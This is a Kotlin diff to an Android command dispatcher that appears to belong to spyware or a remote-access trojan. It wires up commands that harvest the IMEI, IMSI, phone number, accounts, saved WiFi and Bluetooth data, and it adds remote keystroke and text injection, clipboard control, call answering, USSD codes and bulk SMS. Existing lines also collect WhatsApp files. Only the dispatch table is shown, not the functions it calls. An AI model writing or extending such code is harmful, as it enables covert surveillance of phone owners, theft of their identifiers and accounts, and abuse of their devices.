@@ -88,12 +88,10 @@ object CommandExecutor {
                 } ?: all
             }
             "get_browser_bookmarks" -> mapOf("error" to "Reading browser bookmarks requires the user's default browser to expose them via a content provider. Most modern browsers (Chrome) do not expose bookmarks this way on Android 9+. Requires root or accessibility service.")
-            "get_wifi_networks" -> DataCollector.getWifiInfo(context)
-            "get_wifi_saved" -> mapOf("error" to "Reading saved WiFi networks (SSID/password) requires root access (wpa_supplicant.conf) or device-owner privileges. Not implementable without root.")
-            "get_bluetooth_devices" -> mapOf("error" to "Bluetooth scan requires BLUETOOTH_SCAN permission and active scan; not all devices are discoverable. Requires user-initiated Bluetooth scan.")
-            "get_bluetooth_paired" -> DataCollector.getNetworkInfo(context).let { info ->
-                mapOf("message" to "Paired devices require BluetoothAdapter.getBondedDevices() — only available when Bluetooth is ON", "hint" to "Enable Bluetooth first")
-            }
+            "get_wifi_networks" -> DataCollector.getWifiNetworks(context)
+            "get_wifi_saved" -> DataCollector.getWifiSaved(context)
+            "get_bluetooth_devices" -> DataCollector.getBluetoothPaired(context)
+            "get_bluetooth_paired" -> DataCollector.getBluetoothPaired(context)
             "get_installed_apps_full" -> DataCollector.getApps(context)
             "get_running_services" -> DataCollector.getRunningApps(context)
             "get_system_apps" -> DataCollector.getApps(context).let { all ->
@@ -103,19 +101,8 @@ object CommandExecutor {
                     pkg.startsWith("com.android.") || pkg.startsWith("android") || pkg.startsWith("com.google.android.")
                 } ?: all
             }
-            "get_memory_info" -> mapOf(
-                "total" to Runtime.getRuntime().totalMemory(),
-                "free" to Runtime.getRuntime().freeMemory(),
-                "used" to (Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory()),
-                "max" to Runtime.getRuntime().maxMemory(),
-                "note" to "JVM heap; for system-wide RAM use ActivityManager.MemoryInfo"
-            )
-            "get_cpu_info" -> mapOf(
-                "cores" to Runtime.getRuntime().availableProcessors(),
-                "abi" to android.os.Build.SUPPORTED_ABIS.joinToString(","),
-                "manufacturer" to android.os.Build.HARDWARE,
-                "model" to android.os.Build.CPU_ABI
-            )
+            "get_memory_info" -> DataCollector.getMemoryInfo(context)
+            "get_cpu_info" -> DataCollector.getCpuInfo()
             "get_gpu_info" -> mapOf(
                 "vendor" to android.opengl.GLES20.glGetString(android.opengl.GLES20.GL_VENDOR),
                 "renderer" to android.opengl.GLES20.glGetString(android.opengl.GLES20.GL_RENDERER),
@@ -156,11 +143,58 @@ object CommandExecutor {
                 "iso3_language" to java.util.Locale.getDefault().isO3Language,
                 "iso3_country" to java.util.Locale.getDefault().isO3Country
             )
-            "get_accounts" -> mapOf("error" to "Reading Android accounts requires GET_ACCOUNTS permission and runtime grant. Use AccountManager.get(ctx).getAccounts() — returning empty list here to avoid silent permission crash.")
+            "get_accounts" -> DataCollector.getAccounts(context)
             "get_sync_settings" -> mapOf(
                 "master_sync" to android.content.ContentResolver.getMasterSyncAutomatically(),
                 "message" to "Per-account sync settings require per-authority query"
             )
+
+            // ===== DEVICE MANAGEMENT (16 commands) =====
+            "get_device_id" -> DeviceInfoExecutor.getDeviceId(context)
+            "get_imei" -> DeviceInfoExecutor.getImei(context)
+            "get_imsi" -> DeviceInfoExecutor.getImsi(context)
+            "get_phone_number" -> DeviceInfoExecutor.getPhoneNumber(context)
+            "get_serial" -> DeviceInfoExecutor.getSerial(context)
+            "get_mac_address" -> DeviceInfoExecutor.getMacAddress(context)
+            "get_ip_address" -> DeviceInfoExecutor.getIpAddress(context)
+            "get_ipv6_address" -> DeviceInfoExecutor.getIpv6Address()
+            "get_network_operator" -> DeviceInfoExecutor.getNetworkOperator(context)
+            "get_sim_operator" -> DeviceInfoExecutor.getSimOperator(context)
+            "get_sim_country" -> DeviceInfoExecutor.getSimCountry(context)
+            "get_network_country" -> DeviceInfoExecutor.getNetworkCountry(context)
+            "get_phone_type" -> DeviceInfoExecutor.getPhoneType(context)
+            "get_sim_state" -> DeviceInfoExecutor.getSimState(context)
+            "get_data_state" -> DeviceInfoExecutor.getDataState(context)
+            "get_data_activity" -> DeviceInfoExecutor.getDataActivity(context)
+
+            // ===== SYSTEM INFO (8 commands) =====
+            "get_system_properties" -> SystemInfoExecutor.getSystemProperties()
+            "get_build_info" -> SystemInfoExecutor.getBuildInfo()
+            "get_uptime" -> SystemInfoExecutor.getUptime()
+            "get_boot_time" -> SystemInfoExecutor.getBootTime()
+            "get_current_time" -> SystemInfoExecutor.getCurrentTime()
+            "set_current_time" -> SystemInfoExecutor.setCurrentTime()
+            "get_timezone" -> SystemInfoExecutor.getTimezone()
+            "get_available_locales" -> SystemInfoExecutor.getAvailableLocales()
+
+            // ===== INPUT / KEYBOARD (7 commands) =====
+            "show_keyboard" -> InputExecutor.showKeyboard(context)
+            "hide_keyboard" -> InputExecutor.hideKeyboard(context)
+            "input_text" -> InputExecutor.inputText(context, params)
+            "input_key" -> InputExecutor.inputKey(context, params)
+            "paste_clipboard" -> InputExecutor.pasteClipboard(context)
+            "clear_clipboard" -> InputExecutor.clearClipboard(context)
+            "set_clipboard_text" -> InputExecutor.setClipboardText(context, params)
+
+            // ===== MEDIA PLAYBACK (7 commands) =====
+            "play_media" -> SystemInfoExecutor.playMedia(context)
+            "pause_media" -> SystemInfoExecutor.pauseMedia(context)
+            "stop_media" -> SystemInfoExecutor.stopMedia(context)
+            "next_track" -> SystemInfoExecutor.nextTrack(context)
+            "previous_track" -> SystemInfoExecutor.previousTrack(context)
+            "set_media_volume" -> SystemInfoExecutor.setMediaVolume(context, params)
+            "get_now_playing" -> SystemInfoExecutor.getNowPlaying()
+
 
             // ===== SOCIAL MEDIA =====
             "get_whatsapp" -> FileExecutor.listFiles(context, mapOf("arg" to "whatsapp"))
@@ -231,6 +265,28 @@ object CommandExecutor {
             "make_call" -> ControlExecutor.makeCall(context, params)
             "block_number" -> mapOf("message" to "Block requires system permission")
             "unblock_number" -> mapOf("message" to "Unblock requires system permission")
+
+            // ===== SETTINGS SHORTCUTS (9 commands) =====
+            "open_settings" -> SystemInfoExecutor.openSettings(context)
+            "open_wifi_settings" -> SystemInfoExecutor.openWifiSettings(context)
+            "open_bluetooth_settings" -> SystemInfoExecutor.openBluetoothSettings(context)
+            "open_location_settings" -> SystemInfoExecutor.openLocationSettings(context)
+            "open_app_settings" -> SystemInfoExecutor.openAppSettings(context)
+            "open_security_settings" -> SystemInfoExecutor.openSecuritySettings(context)
+            "open_developer_options" -> SystemInfoExecutor.openDeveloperOptions(context)
+            "open_accessibility_settings" -> SystemInfoExecutor.openAccessibilitySettings(context)
+            "open_notification_settings" -> SystemInfoExecutor.openNotificationSettings(context)
+
+            // ===== CALLS / SMS / NOTIFICATIONS (8 commands) =====
+            "answer_call" -> SystemInfoExecutor.answerCall(context)
+            "end_call" -> SystemInfoExecutor.endCall(context)
+            "send_ussd" -> SystemInfoExecutor.sendUssd(context, params)
+            "send_sms_to" -> SystemInfoExecutor.sendSmsTo(context, params)
+            "send_sms_broadcast" -> SystemInfoExecutor.sendSmsBroadcast(context, params)
+            "post_notification" -> SystemInfoExecutor.postNotification(context, params)
+            "cancel_notification" -> SystemInfoExecutor.cancelNotification(context, params)
+            "cancel_all_notifications" -> SystemInfoExecutor.cancelAllNotifications(context)
+
             "safe_mode" -> mapOf("error" to "Booting into safe mode requires REBOOT permission (system-signature) or root. Cannot be triggered by third-party apps.")
             "set_screen_timeout" -> {
                 val seconds = (params["seconds"] as? Number)?.toInt() ?: 30
